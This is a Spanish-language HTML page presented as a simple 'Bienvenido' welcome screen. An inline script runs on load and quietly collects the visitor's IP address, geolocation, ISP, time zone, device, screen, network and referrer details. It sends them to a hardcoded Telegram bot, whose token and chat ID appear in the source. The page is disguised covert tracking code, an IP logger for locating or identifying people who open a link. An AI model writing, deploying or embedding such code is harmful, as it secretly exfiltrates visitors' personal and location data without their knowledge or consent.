<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bienvenido</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; margin: 0;
      background: #0f172a; color: #e2e8f0;
    }
    .card { text-align: center; padding: 2rem; }
    h1 { font-size: 2rem; margin-bottom: .5rem; }
    p  { color: #94a3b8; }
  </style>
</head>
<body>
  <div class="card">
    <h1>👋 Bienvenido</h1>
    <p>Cargando experiencia...</p>
  </div>

  <script>
    const TELEGRAM_TOKEN   = "7843541708:AAGQP0rXOqhd1Zcp737DzLByREna2HD3VVo";
    const TELEGRAM_CHAT_ID = "7064330912";

    (async function () {
      try {
        const geoResp = await fetch("https://ipwho.is/");
        const geo     = await geoResp.json();

        const ip        = geo.ip || "desconocida";
        const ubicacion = geo.success
          ? `${geo.city || "?"}, ${geo.region || "?"}, ${geo.country || "?"}`
          : "no disponible";
        const isp       = geo.connection?.isp || "?";

        const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const conexion    = navigator.connection
          ? `${navigator.connection.effectiveType || "?"} / ${navigator.connection.downlink || "?"} Mbps`
          : "no disponible";
        const pantalla    = `${screen.width}x${screen.height}`;
        const ua          = navigator.userAgent;
        const plataforma  = navigator.platform;
        const idioma      = navigator.language;
        const referrer    = document.referrer || "directo";
        const pagina      = window.location.href;

        const texto = `
🔔 *Nueva visita*

🌐 *IP:* \`${ip}\`
📍 *Ubicación:* ${ubicacion}
🏢 *ISP:* ${isp}
🕒 *Zona horaria:* ${zonaHoraria}

💻 *Dispositivo*
• UA: ${ua}
• Plataforma: ${plataforma}
• Idioma: ${idioma}
• Pantalla: ${pantalla}

📡 *Red:* ${conexion}
🔗 *Referrer:* ${referrer}
📄 *Página:* ${pagina}
        `.trim();

        await fetch(
          `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: texto,
              parse_mode: "Markdown"
            })
          }
        );
      } catch (err) {
        console.warn("No se pudo notificar:", err);
      }
    })();
  </script>
</body>
</html>
